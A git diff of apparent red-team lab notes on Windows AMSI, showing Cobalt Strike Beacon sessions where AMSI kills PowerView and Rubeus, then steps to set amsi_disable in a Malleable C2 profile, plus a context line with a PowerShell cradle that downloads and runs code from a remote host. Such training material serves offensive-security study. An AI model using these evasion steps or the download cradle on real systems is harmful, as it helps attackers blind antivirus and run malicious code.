@@ -205,4 +205,57 @@ It uses the compress.ps1 template instead, which extracts the payload from a Gzi
 
     PS C:\Users\Attacker> iex (new-object net.webclient).downloadstring("http://10.10.5.50/a2")
 
-## 
+## AMSI vs Post-Exploitation
+
+AMSI will also catch various post-exploitation commands which AMSI can instrument (e.g. PS, powerpick, and execute-assembly). Beacon spawns new processes to execute these commands, and each process gets its own copy of AMSI. Here Beacon spawns powershell.exe and attempts to load PowerView.ps1, but caught by AMSI and killed it and  the process that spawned it (Beacon):
+
+    beacon> run hostname
+    fs
+    beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+    beacon> powershell Get-Domain
+    [-] lost link to parent beacon: 10.10.123.102
+    
+    beacon> remote-exec winrm fs Get-MpThreatDetection
+    PSComputerName        : fs
+    ProcessName           : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    RemediationTime       : 9/14/2022 5:01:18 PM
+    Resources             : {amsi:_\Device\HarddiskVolume1\Windows\System32\WindowsPowerShell\v1.0\powershell.exe}
+
+The same happens if executing a known .NET assembly:
+
+    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
+    [-] Failed to load the assembly w/hr 0x8007000b
+    [-] lost link to parent beacon: 10.10.123.102
+    PSComputerName                 : fs
+    ProcessName                    : C:\Windows\System32\rundll32.exe
+    RemediationTime                : 9/14/2022 5:18:35 PM
+    Resources                      : {amsi:_\Device\HarddiskVolume1\Windows\System32\rundll32.exe}
+
+CS has a config in Malleable C2 called amsi_disable, which patches memory to disable AMSI in the spawned process prior to injecting the post-ex capability. amsi_disable only applies to powerpick, execute-assembly, and psinject (not PS).
+
+1: SSH into the team server and open the profile used (e.g. webbug.profile):
+
+    attacker@ubuntu ~/cobaltstrike> vim c2-profiles/normal/webbug.profile
+
+2: Just above the http-get block add:
+
+    post-ex {
+            set amsi_disable "true";
+    }
+
+3: Check the profile with c2lint to make sure it still works:
+
+    attacker@ubuntu ~/cobaltstrike> ./c2lint c2-profiles/normal/webbug.profile
+
+4: Restart team server and re-acquire a Beacon on the file server. Execute Rubeus:
+
+    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
+
+Beacon probably still dies quickly; see behavioural detections below.
+
+## Manual AMSI Bypasses
+
+You may run into situations where ThreatCheck gives the "all clear" on a payload, but it still gets caught by AMSI.  This is particularly troublesome for initial access or lateral movement payloads, because Beacon's amsi_disable directive does not apply to them.
+
+
+
